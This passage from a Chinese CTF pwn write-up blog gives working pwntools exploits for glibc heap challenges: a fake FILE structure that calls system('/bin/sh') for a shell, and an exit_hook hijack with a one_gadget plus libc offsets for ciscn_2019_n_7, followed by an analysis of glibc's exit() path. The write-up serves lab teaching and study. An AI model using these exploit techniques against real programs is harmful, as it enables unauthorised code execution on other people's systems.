p.recvuntil(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content, price:<span class="built_in">int</span>, color:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size:<span class="built_in">int</span>, content, price:<span class="built_in">int</span>, color:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Price of Orange: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Color of Orange: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>  + p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>), <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    new(<span class="number">0x1000</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    new(<span class="number">0x400</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    dump()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">    fake_file += p64(<span class="number">0x61</span>) <span class="comment"># _IO_read_ptr, chunk size, got it into proper small bin</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(heap_base + <span class="number">0x600</span>) <span class="comment"># fake vtable`</span></span><br><span class="line">    fake_file += <span class="number">20</span> * p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x1000</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + fake_file, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/11/q5paW1fs7Tvl8yg.png" alt="image.png"></p>
<h2 id="0x-lctf2016-pwn200-House-of-Spirit"><a href="#0x-lctf2016-pwn200-House-of-Spirit" class="headerlink" title="0x???.lctf2016_pwn200 - House of Spirit"></a>0x???.lctf2016_pwn200 - House of Spirit</h2><p>惯例的 <code>checksec</code>，保  护  全  关</p>
<p><img src="https://i.loli.net/2021/05/13/cUdrY5hlZNqDKgw.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<h2 id="0x-ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><a href="#0x-ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP" class="headerlink" title="0x???.ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP"></a>0x???.ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</h2><p>惯例的<code>checksec</code>，保  护  全  开（噔  噔  咚</p>
<p><img src="https://i.loli.net/2021/01/28/eBdwI7PSxn3ypCO.png"></p>
<p>拖入IDA进行分析，可知该程序有着分配、编辑、打印堆块的功能</p>
<p>但是我们<strong>仅能够分配一个堆块，且无法释放堆块</strong></p>
<p><img src="https://i.loli.net/2021/01/28/9aomlHGesxkAqrF.png"></p>
<p>漏洞点在于创建&#x2F;编辑堆块时输入作者姓名时<strong>存在溢出，可以覆写掉与其相邻的堆块指针</strong>，在接下来的编辑中我们便可以<strong>实现任意地址写</strong></p>
<p><img src="https://i.loli.net/2021/01/28/Lq7cFMxUl6ytRiG.png"></p>
<p><img src="https://i.loli.net/2021/01/28/HnhJeRX21OWp5Mq.png"></p>
<p>同时，<strong>输入666则可直接泄露libc地址</strong></p>
<p><img src="https://i.loli.net/2021/01/28/D3g5PRshQfFxVy6.png"></p>
<p><img src="https://i.loli.net/2021/01/28/hUdkKbNwqr2WZap.png"></p>
<h3 id="解法一：劫持exit-hook"><a href="#解法一：劫持exit-hook" class="headerlink" title="解法一：劫持exit_hook"></a>解法一：劫持exit_hook</h3><p>由于程序退出时必定会调用<code>exit()</code>函数，故考虑<strong>劫持exit_hook为one_gadget后退出程序即可get shell</strong></p>
<p>需要注意的一点是在计算<code>_rtld_global</code>的相对偏移时，由于libc中同名函数的存在，导致ELF.sym不可用，此处需要我们手动调试算出相对偏移（似乎这个结构体不在libc而在ld中，等笔者有时间再进一步研究）</p>
<blockquote>
<h3 id="rtld-global的偏移…"><a href="#rtld-global的偏移…" class="headerlink" title="_rtld_global的偏移…"></a>_rtld_global的偏移…</h3><p>libc2.23下偏移为0x5f0040，两个hook的偏移为3848和3850</p>
<p>libc2.27下偏移为0x61b060，两个hook的偏移为3840和3848</p>
<p><strong>libc2.31下该劫持方法失效，但是可更改为劫持__elf_set___libc_atexit_element__IO_cleanup__，偏移为0x1ed608</strong></p>
</blockquote>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;, 26348)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)#</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>((p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input string Length: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + <span class="number">0x5f0040</span>+<span class="number">3848</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New contents:&quot;</span>)</span><br><span class="line">p.send(p64(libc_base + one_gadget)*<span class="number">2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/30/kugE3iTBZFDc8xG.png"></p>
<blockquote>
<h4 id="exit-函数利用相关…"><a href="#exit-函数利用相关…" class="headerlink" title="exit()函数利用相关…"></a>exit()函数利用相关…</h4><p>一个Linux程序的执行流程应当如下图所示：</p>
<p><img src="https://i.loli.net/2021/02/05/hZ3KjroJWDPQBcl.png"></p>
<p>考虑如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Note: the fini parameter is ignored here for shared library.  It</span></span><br><span class="line"><span class="comment">is registered with __cxa_atexit.  This had the disadvantage that</span></span><br><span class="line"><span class="comment">finalizers were called in more than one place.  */</span></span><br><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">		 <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">		 ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params">		 __typeof (main) init,</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该段代码为<code>__libc_start_main()</code>函数的部分代码，该函数定义于csu&#x2F;libc-start.c中</p>
<p>我们不难从中看出，<strong>当一个程序结束的时候，都会缺省调用</strong><code>exit()</code><strong>函数</strong></p>
<p>exit()函数定义于stdlib&#x2F;exit.c中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">__run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure>

<p><del>依旧是libc中常见的套娃函数</del>，其调用了<code>__run_exit_handlers()</code>函数，我们继续对齐跟进</p>
<p>该函数同样定义于stdlib&#x2F;exit.c中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">		     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (run_dtors)</span><br><span class="line">__call_tls_dtors ();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">exit (). */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">__libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">restart:</span><br><span class="line">cur = *listp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">	     atexit/on_exit registrations.  */</span></span><br><span class="line">	  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">	  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      atfct ();</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">		 we must mark this function as ef_free.  */</span></span><br><span class="line">	      f-&gt;flavor = ef_free;</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="comment">/* Re-lock again before looking at global state.  */</span></span><br><span class="line">	  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">	    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">	       more exit functions.  Start the loop over.  */</span></span><br><span class="line">	    <span class="keyword">goto</span> restart;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">*listp = cur-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">	<span class="built_in">free</span> (cur);</span><br><span class="line"></span><br><span class="line">__libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">_exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数经过一系列的处理之后最终会调用<code>_exit()</code>函数，<strong>通过系统调用exit结束进程的生命</strong></p>
<p>观察到于该函数中有三个函数指针：<code>atfct</code>、<code>onfct</code>、<code>cxafct</code>，分别会根据listp（上层函数传参静态指针<code>__exit_funcs</code>，指向<code>exit_function_list</code>类型结构体静态变量<code>initial</code>，exit_function_list结构体中有着32个<code>exit_function</code>结构体变量，该类型结构体使用联合体的方式储存三种函数指针，进程中的所有exit_function_list链接成一单向链表）中不同的exit_function的flavor的不同值调用不同的函数指针</p>
<p>使用gdb进行动态调试，我们可以发现其调用的其中一个函数为<code>_dl_fini()</code></p>
<p><img src="https://i.loli.net/2021/01/30/4bsPKuojYZ2pgdJ.png"></p>
<p>该函数定义于elf&#x2F;dl-fini.c中，我们主要关注如下部分代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">...</span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>

<p>在这里用到了两个宏<code>__rtld_lock_lock_recursive</code>和<code>__rtld_lock_unlock_recursive</code>，其定义于sysdeps&#x2F;nptl&#x2F;libc-lockP.h中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">...</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span></span><br></pre></td></tr></table></figure>

<p>这里用到了一个宏<code>GL()</code>，该宏定义于sysdeps&#x2F;generic&#x2F;ldsodefs.h中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EXTERN extern</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _##name</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EXTERN</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span 